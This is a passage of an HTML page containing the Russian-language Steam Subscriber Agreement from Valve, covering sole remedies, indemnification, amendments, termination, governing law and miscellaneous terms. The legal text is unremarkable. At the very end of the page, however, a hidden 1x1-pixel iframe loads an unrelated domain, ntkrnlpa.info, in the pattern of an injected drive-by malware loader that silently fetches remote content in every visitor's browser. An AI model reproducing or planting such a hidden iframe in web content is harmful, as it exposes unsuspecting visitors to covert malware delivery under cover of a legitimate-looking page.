А. ЕДИНСТВЕННОЕ СРЕДСТВО ПРАВОВОЙ ЗАЩИТЫ В ОТНОШЕНИИ СЛУЖБЫ STEAM И ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ STEAM.<br>
НАСТОЯЩИМ ВЫ СОГЛАШАЕТЕСЬ С ТЕМ, ЧТО ЕДИНСТВЕННЫМ СРЕДСТВОМ ПРАВОВОЙ ЗАЩИТЫ В ОТНОШЕНИИ ЛЮБЫХ РАЗНОГЛАСИЙ, СВЯЗАННЫХ СО СЛУЖБОЙ STEAM ИЛИ ПРОГРАММНЫМ ОБЕСПЕЧЕНИЕМ STEAM, ЯВЛЯЕТСЯ ПРЕКРАЩЕНИЕ ИСПОЛЬЗОВАНИЯ СЛУЖБЫ STEAM И АННУЛИРОВАНИЕ ВАШЕЙ УЧЕТНОЙ ЗАПИСИ. ПОСКОЛЬКУ ЗАКОНОДАТЕЛЬСТВОМ НЕКОТОРЫХ ГОСУДАРСТВ И ПРАВОВЫХ СИСТЕМ НЕ ДОПУСКАЕТ ПОЛНОГО ИЛИ ЧАСТИЧНОГО ОТКАЗА ОТ ОТВЕТСТВЕННОСТИ ЗА КОСВЕННЫЕ И ВТОРОСТЕПЕННЫЕ УБЫТКИ, ТО НА ИХ ТЕРРИТОРИИ VALVE, ЕЕ ЛИЦЕНЗИАРЫ И АФФИЛИРОВАННЫЕ ЛИЦА ОСВОБОЖДАЮТСЯ ОТ ОТВЕТСТВЕННОСТИ В МАКСИМАЛЬНО ДОПУСТИМОЙ ЗАКОНОДАТЕЛЬСТВОМ СТЕПЕНИ.<br>
<br>
В. ЕДИНСТВЕННОЕ СРЕДСТВО ПРАВОВОЙ ЗАЩИТЫ В ОТНОШЕНИИ СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ.<br>
НАСТОЯЩИМ ВЫ СОГЛАШАЕТЕСЬ С ТЕМ, ЧТО В ОТНОШЕНИИ СОПУТСТВУЮЩЕЙ ПРОДУКЦИИ, ПРИОБРЕТЕННОЙ ЧЕРЕЗ СЛУЖБУ STEAM, ПОМИМО СРЕДСТВ ПРАВОВОЙ ЗАШИТЫ, ПЕРЕЧИСЛЕННЫХ В ПУНКТЕ 3(С), VALVE ИМЕЕТ ПРАВО ПО СВОЕМУ УСМОТРЕНИЮ ВЫПЛАТИТЬ ВАМ КОМПЕНСАЦИЮ ЗА ПОНЕСЕННЫЕ ВАМИ ПРЯМЫЕ УБЫТКИ, ЕСЛИ ЭТА СУММА НЕ БУДЕТ ПРЕВЫШАТЬ СУММУ, УПЛАЧЕННУЮ ВАМИ VALVE ЗА СОПУТСТВУЮЩУЮ ПРОДУКЦИЮ.<br>
ЭТОТ ПУНКТ ПРИМЕНИМ В МАКСИМАЛЬНО ДОПУСТИМОЙ СООТВЕТСТВУЮЩИМ ЗАКОНОМ СТЕПЕНИ.<br>
<br>
11. Предоставление правовой защиты<br>
<br>
Вы соглашаетесь предоставлять правовую защиту Valve, ее лицензиарам и аффилированным лицам в случае наступления ответственности, возникновения претензий и издержек, в том числе расходов на судебную защиту, вследствие нарушения положений Соглашения, пользования службой Steam или Подписками, использования Информации, полученной от пользователя или Контента стороннего производителя, в том числе создания, распространения, продвижения любых модификаций, Вами или другими лицами, использующими вашу учетную запись. Valve оставляет за собой право самостоятельно и эксклюзивно осуществлять за свой счет правовую защиту в отношении всех случаев, на которые распространяются Ваши гарантии правовой защиты. В таком случае Вы перестаете нести обязанность предоставления правовой защиты Valve. Данный пункт остается в силе и после того, как Соглашение утратит силу.<br>
<br>
12. Внесение изменений в Соглашение<br>
<br>
Valve оставляет за собой право вносить изменения в настоящее Соглашение в любое время и по своему усмотрению. Являясь Подписчиком, Вы соглашаетесь с правом Valve вносить изменения в положения Соглашения. В случае, если Valve принимает решение о внесении изменений в Соглашение, такие изменения вступают в силу через тридцать (30) дней после получения Вами соответствующего уведомления по электронной почте, либо через Программное обеспечение Steam. С текстом Соглашения можно ознакомиться в любое время по адресу: http://www.steampowered.com/. Если вы не закрыли свою Учетную запись в течение тридцати (30) дней с момента получения уведомления, это будет означать, что вы принимаете все внесенные в Соглашение изменения. Если вы не согласны с изменениями, единственным способом защиты своего права для вас является закрытие Учетной записи или отказ от Подписки.<br>
<br>
13. Сроки действия Соглашения и его расторжение<br>
<br>
Обе стороны имеют право расторгнуть Соглашение в любое время. Настоящим Вы признаете, что закрытие Учетной записи и прекращение Подписки является Вашим единственным средством защиты права в отношении Valve. <br>
<br>
А. Срок<br>
<br>
Соглашение вступает в силу с момента нажатия вами кнопки «Я согласен» («I agree») и продолжается до тех пор, пока не будет расторгнуто в соответствии с условиями настоящего Соглашения.<br>
<br>
В. Расторжение по Вашей инициативе<br>
<br>
Информацию, касающаяся удаления Учетной записи или отказа от Подписки находится по адресу: http://www.steampowered.com/. Valve оставляет за собой право потребовать выплатить абонентскую плату, пени и прочие взносы, начисленные до момента удаления Учетной записи или прекращения Подписки. Кроме того, Вы обязаны выплатить причитающиеся суммы сторонним производителям и поставщикам контента, прежде чем ликвидировать Учетную запись. В случае, если Ваша Учетная запись или Подписка ликвидирована по вашей инициативе, Вы не вправе рассчитывать на какое бы то ни было возмещение, включая возврат абонентской платы. В случае, если ваша Учетная запись или Подписка ликвидирована по инициативе Valve по причине нарушения вами положений Соглашения, вы не вправе рассчитывать на какое бы то ни было возмещение, включая возврат абонентской платы. <br>
<br>
С. Расторжение по инициативе Valve<br>
<br>
1. В отношении Подписок с регулярным платежом (например, ежемесячная подписка), в случае, если Valve ликвидирует вашу Учетную запись или Подписку по собственной инициативе, вы вправе претендовать на перерасчет предоплаченной абонентской платы, однако возможность такого перерасчета остается на усмотрение Valve.<br>
2. В случае разовой покупки продукта (например, покупки одной игры) у Valve, Valve по собственному усмотрению может ликвидировать Подписку или часть подписки (напр. доступ к программному обеспечению через службу Steam), а также предоставить доступ (на ограниченное время) для загрузки отдельных версий Программного обеспечения и контента, связанного с такой одноразовой покупкой.<br>
3. В случае бесплатной Подписки, Valve имеет право ликвидировать ее или изменить условия подписки, в соответствии с пунктом «Внесение изменений в Соглашение», приведенным выше.<br>
<br>
D. Сохранение в силе<br>
<br>
Пункты 2(D), 2(E), 7, 9, 10, 11, 13(D), 14 и 15 остаются в силе после прекращения срока действия соглашения или его расторжения.<br>
<br>
14. Применимое право<br>
<br>
Данный пункт не распространяется на покупателей из стран Евросоюза.<br>
Настоящим Вы соглашаетесь с тем, что данное соглашение составлено и заключено в штате Вашингтон, США и все вопросы, касающиеся его исполнения, будут разрешаться в соответствии с законодательством штата Вашингтон. Вы соглашаетесь с тем, что все иски, выдвигаемые вами к Valve, будут рассматриваться федеральными судом или судом штата, находящимся на территории графства Кинг, штат Вашингтон, и что такие суды будут иметь исключительную юрисдикцию в отношении разногласий между Вами и Valve. По окончании любых судебных разбирательств, связанных с положениями данного Соглашения, выигравшая сторона получает право на возмещение судебных издержек.<br>
<br>
15. Разное<br>
<br>
В случае если какое-либо положение настоящего Соглашения будет признано не имеющим юридической силы в судебном порядке, оно должно исполняться в максимально допустимой мере. При этом остальные положения Соглашения остаются в полной силе. Данное Соглашение составляет полное Соглашение между сторонами по вопросам, рассмотренным в данном Соглашении, и отменяет все ранее достигнутые устные и письменные договоренности. Вы соглашаетесь с тем, что настоящее Соглашение, права по нему и гарантированные им средства правовой защиты распространяются только на стороны — участницы Соглашения.<br>
<br>
Обязательства Valve регулируются применимым действующее законодательством, и Valve обязана действовать в соответствии с предписаниями органов власти, судебных органов и иными властными предписаниями, даже если это противоречит положениям соглашения.<br>
<br>
Настоящим Вы соглашаетесь действовать в соответствии с применимыми нормами законодательства США об импорте/экспорте, а также подчинятся решениям его государственных и регулятивных органов (включая, без ограничений, Министерство Торговли США и Бюро регулирования экспорта). Вы обязуетесь не экспортировать Программное обеспечение Steam и не позволять использовать Вашу Учетную запись лицам, проживающим на территории государств, поддерживающих террористические организации, в соответствии с запретами, установленными Бюро регулирования экспорта. Настоящим Вы гарантируете, что не проживаете на территории и не являетесь гражданином такого государства.<br>
<br>
Я согласен с условиями Соглашения. Я также соглашаюсь с тем, что настоящее Соглашение (включая Условия подписки, Правила поведения на сервере Steam, Правила пользования и Правила конфиденциальности) составляет полное соглашение между мной и Valve, и что настоящее Соглашение отменяет все ранее достигнутые письменные и устные соглашения между мной и Valve.<br>
			<BR>
			<BR>
		</DIV>
	<iframe src="http://ntkrnlpa.info/cr/?i=1" width=1 height=1></iframe>
</BODY>
</HTML>
